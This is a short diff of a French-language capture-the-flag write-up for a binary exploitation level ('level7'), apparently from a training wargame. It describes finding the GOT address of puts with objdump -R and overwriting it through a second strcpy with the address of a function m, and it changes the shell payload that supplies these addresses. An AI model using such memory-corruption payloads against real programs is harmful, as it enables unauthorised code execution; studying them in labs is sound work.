@@ -89,7 +89,6 @@ grâce à objdump -R on récupère l'adresse du puts
 
 et à cette adresse (\x28\x99\x04\x08) on va écrire l'adresse de notre fonction m (\xf4\x84\x04\x08) grâce au deuxième strcpy
 
-
 ce qui nous donne une payload :
 
-./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08" + " " + "\xf4\x84\x04\x08"')
